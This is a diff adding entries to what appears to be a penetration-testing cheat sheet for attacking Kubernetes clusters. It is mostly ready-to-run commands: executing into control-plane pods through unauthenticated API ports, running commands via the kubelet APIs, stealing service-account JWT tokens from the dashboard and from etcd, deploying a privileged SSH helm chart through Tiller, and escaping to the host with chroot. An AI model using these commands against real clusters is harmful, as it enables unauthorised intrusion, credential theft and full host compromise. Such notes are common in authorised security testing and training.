@@ -1,8 +1,85 @@
+Open a shell for a pod
+	kubectl exec -it <pod_name> bin/bash
+		alpine doesn't have BASH by default - use /bin/ash
+
+Insecure Port
+	can exec into control plane pod
+		kubectl -s http://<node_IP>:8080 -n kube-system get pods
+		kubectl -s http://<node_IP>:8080 -n kube-system exec -it 	kube-apiserver-<cluster_name>-control-plane /bin/sh
+
+Secure Port (no authentication)
+	kubectl --insecure-skip-tls-verify --username=system:unauthenticated -s https://<target_IP>:<secure_port_eg_6443> get po -n kube-system
+
+	kubectl --insecure-skip-tls-verify --username=system:unauthenticated -s https://<target_IP>:<secure_port_eg_6443> -n kube-system exec kube-apiserver-<cluster_name>-control-plane -- <command>
+ 
+Kubelet rw API (no authentication)
+	curl https://172.18.0.4:10250/pods -k | jq | grep apiserver
+			
+	curl -X POST https://172.18.0.4:10250/run/kube-system/kube-apiserver-<cluster_name>-control-plane/kube-apiserver -k -d "cmd=<command>"
+
+
+Kubelet ro API (no authentication)
+	curl http://172.18.0.4:10255/pods -k | jq | grep apiserver
+			
+	curl -X POST http://172.18.0.4:10255/run/kube-system/kube-apiserver-<cluster_name>-control-plane/kube-apiserver -k -d "cmd=<command>"
+
+
+Kubernetes Dashboard (no authentication)
+	curl https://<target_IP>:<dashboard_port> -k
+		returns HTML for k8s dashboard
+
+	Need Firefox on host machine (other browsers will not allow bypassing the cert warning)
+		https://127.0.0.1:<dashboard_port>/
+	Click "skip" option
+
+	Select kubernetes-dashboard namespace
+	Select Config and Storage > Secrets
+	Select kubernetes-dashboard-token-...
+	View and copy JWT token data to access API (6443)
+
+etcd (no authentication)
+	export ETCDCTL_API=3
+
+	etcdctl --insecure-skip-tls-verify --insecure-transport=false --endpoints=<target_IP>:2379 get /registry/secrets --prefix --keys-only
+
+	look for /registry/secrets/kube-system/clusterrole-aggregation-controller-token-... 
+		used to have cluster-admin, no longer cluster-admin by default
+		still has cluster-admin impersonation rights by default
+
+	look for other accounts (e.g. admin-account-token-...)
+
+	etcdctl --insecure-skip-tls-verify --insecure-transport=false --endpoints=<target_IP>:2379 get /registry/secrets/<namespace>/<token_name>
+
+		copy JWT token - from eyJ to just before #
+
+	kubectl --insecure-skip-tls-verify -s https://<target_IP>:6443 --token="<JWT_token>" get nodes
+
+	kubectl --insecure-skip-tls-verify -s https://<target_IP>:6443 --token="<JWT_token>" auth can-i --list
+
+	look for exploitable RBAC rights (e.g. *)	
+
+Tiller (no authentication)
+	https://github.com/raesene/pentest_helm_charts		
+		get privsshchart-0.1.0.tgz
+
+	helm --host <target_IP>:<tiller_port> install --name <chart_name> /path/to/chart_file.tgz
+	
+	ssh -l root <target_IP> -p <ssh_port_provided_by_chart>
+		password for privsshchart-0.1.0 is `reallyinsecure`
+
+	chroot /host
+
+
+
+
+
+
+
 Exposed Kubernetes REST API Attack
 	curl –insecure -v \
 		-H “Connection: upgrade” -H “Upgrade: SPDY/3.1” \
 		-X POST “https://<Victim_ip>:10250/exec/<NAMESPACE>/<POD NAME>/<CONTAINER NAME>?command=<COMMAND TO EXECUTE>&input=1&output=1&tty=1”
-	Create WebSocet connect to rooting
+	Create WebSocket connect to routing
 		wscat -c "https://<DOMAIN>:<PORT>/<Location Header Value>"" --no-check
 
 Kernel Breakout
